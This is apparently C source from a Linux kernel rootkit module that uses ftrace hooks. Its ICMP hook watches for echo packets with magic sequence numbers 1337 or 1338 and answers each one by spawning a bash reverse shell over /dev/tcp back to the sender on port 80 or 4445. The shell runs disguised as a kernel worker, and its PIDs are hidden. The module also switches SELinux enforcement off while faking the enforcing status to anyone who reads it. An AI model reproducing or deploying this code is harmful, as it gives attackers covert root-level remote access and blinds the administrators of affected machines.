#include "../include/core.h"
#include "../include/icmp.h"
#include "../include/hidden_pids.h"
#include "../ftrace/ftrace_helper.h"

/* Per-slot hardcoded ports (must match hiding_tcp.c PORT / PORT2) */
#define SRV_PORT  "80"
#define SRV_PORT2 "4445"

/* Magic ICMP echo sequences that identify which slot to fill */
#define ICMP_MAGIC_SEQ  1337   /* slot 0 */
#define ICMP_MAGIC_SEQ2 1338   /* slot 1 */

#define PROC_NAME "[kworker/0:1]"

/* Exported: registered IPs for each instance, filled on first ICMP trigger.
 * All stealth modules (hiding_tcp, bpf_hook, clear_taint_dmesg) read this. */
__be32 g_srv_ips[MAX_INSTANCES] = {0};
EXPORT_SYMBOL(g_srv_ips);

/* Protects g_srv_ips[].  Written from ICMP softirq, read from hook functions.
 * Use spin_lock_irqsave / spin_unlock_irqrestore in all paths. */
DEFINE_SPINLOCK(g_srv_ips_lock);
EXPORT_SYMBOL(g_srv_ips_lock);

static asmlinkage int (*orig_icmp_rcv)(struct sk_buff *);
static asmlinkage ssize_t (*orig_sel_read_enforce)(struct file *, char __user *, size_t, loff_t *);
static asmlinkage ssize_t (*orig_sel_write_enforce)(struct file *, const char __user *, size_t, loff_t *);

struct revshell_work {
    struct work_struct work;
    char ip[INET_ADDRSTRLEN]; /* dotted-decimal string, filled from packet src */
    const char *port;         /* points to SRV_PORT or SRV_PORT2 */
};

static void *selinux_state_ptr = NULL;
static bool enforce_hook_active = false;
static int fake_enforce_value = 1;

notrace static asmlinkage ssize_t hook_sel_write_enforce(
    struct file *filp,
    const char __user *buf,
    size_t count,
    loff_t *ppos)
{
    char kbuf[32];
    long val;
    int ret;
    
    if (!enforce_hook_active)
        return orig_sel_write_enforce(filp, buf, count, ppos);
    
    if (count > 0 && count < sizeof(kbuf)) {
        if (copy_from_user(kbuf, buf, count))
            return -EFAULT;
        
        kbuf[count] = '\0';
        
        ret = kstrtol(kbuf, 10, &val);
        if (ret == 0) {
            fake_enforce_value = (int)val;
        }
    }
    
    *ppos += count;
    return count;
}

notrace static asmlinkage ssize_t hook_sel_read_enforce(
    struct file *filp,
    char __user *buf, 
    size_t count,
    loff_t *ppos)
{
    char tmpbuf[12];
    ssize_t length;
    
    if (enforce_hook_active) {
        length = scnprintf(tmpbuf, sizeof(tmpbuf), "%d",
                          fake_enforce_value);
        
        return simple_read_from_buffer(buf, count, ppos, tmpbuf, length);
    }
    
    return orig_sel_read_enforce(filp, buf, count, ppos);
}

notrace static int bypass_selinux_disable(void)
{
    struct {
        bool enforcing;
        bool checkreqprot;
        bool initialized;
    } *state;
    
    if (!selinux_state_ptr)
        return -1;
    
    state = selinux_state_ptr;
    
    #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
    state->enforcing = 0;
    enforce_hook_active = true;
    fake_enforce_value = 1;
    #endif
    
    return 0;
}

notrace static void spawn_revshell(struct work_struct *work)
{
    struct revshell_work *rw = container_of(work, struct revshell_work, work);
    char cmd[768];
    static char *envp[] = {
        "HOME=/",
        "TERM=xterm-256color", 
        "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
        NULL
    };
    char *argv[] = {"/bin/bash", "-c", cmd, NULL};
    struct subprocess_info *sub_info;
    
    extern void enable_umh_bypass(void);
    extern void disable_umh_bypass(void);
    
    enable_umh_bypass();
    
    add_hidden_pid(current->pid);
    add_hidden_pid(current->tgid);
    
    bypass_selinux_disable();
    
    msleep(50);
    
    snprintf(cmd, sizeof(cmd),
             "bash -c '"
             "PID=$$; "
             "kill -59 $PID 2>/dev/null; "
             "exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1"
             "' 2>/dev/null &",
             PROC_NAME, rw->ip, rw->port);
    
    sub_info = call_usermodehelper_setup(argv[0], argv, envp,
                                        GFP_KERNEL, NULL, NULL, NULL);
    if (sub_info)
        call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    
    disable_umh_bypass();
    
    kfree(rw);
}

/* Per-slot port table (index must match g_srv_ips slot) */
static const char * const slot_ports[MAX_INSTANCES] = { SRV_PORT, SRV_PORT2 };
static const u16 slot_seqs[MAX_INSTANCES] = { ICMP_MAGIC_SEQ, ICMP_MAGIC_SEQ2 };

notrace static asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
{
    struct iphdr *iph;
    struct icmphdr *icmph;
    struct revshell_work *rw;
    unsigned long flags;
    u16 seq;
    int slot;

    if (!skb)
        goto out;

    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP)
        goto out;

    icmph = icmp_hdr(skb);
    if (!icmph || icmph->type != ICMP_ECHO)
        goto out;

    seq = ntohs(icmph->un.echo.sequence);

    for (slot = 0; slot < MAX_INSTANCES; slot++) {
        if (seq != slot_seqs[slot])
            continue;

        /* Register/update the IP for this slot from the packet source.
         * Active shells connect back on the port (which is still hidden),
         * so an IP change only affects newly spawned shells. */
        spin_lock_irqsave(&g_srv_ips_lock, flags);
        g_srv_ips[slot] = iph->saddr;
        spin_unlock_irqrestore(&g_srv_ips_lock, flags);

        rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
        if (rw) {
            snprintf(rw->ip, sizeof(rw->ip), "%pI4", &iph->saddr);
            rw->port = slot_ports[slot];
            INIT_WORK(&rw->work, spawn_revshell);
            schedule_work(&rw->work);
        }
        break;
    }

out:
    return orig_icmp_rcv(skb);
}

static struct ftrace_hook hooks[] = {
    HOOK("icmp_rcv", hook_icmp_rcv, &orig_icmp_rcv),
    HOOK("sel_read_enforce", hook_sel_read_enforce, &orig_sel_read_enforce),
    HOOK("sel_write_enforce", hook_sel_write_enforce, &orig_sel_write_enforce),
};

notrace int hiding_icmp_init(void)
{
    unsigned long addr;
    
    addr = (unsigned long)resolve_sym("selinux_state");
    if (addr)
        selinux_state_ptr = (void *)addr;
    
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hiding_icmp_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    enforce_hook_active = false;
    fake_enforce_value = 1;
    msleep(2000);
}
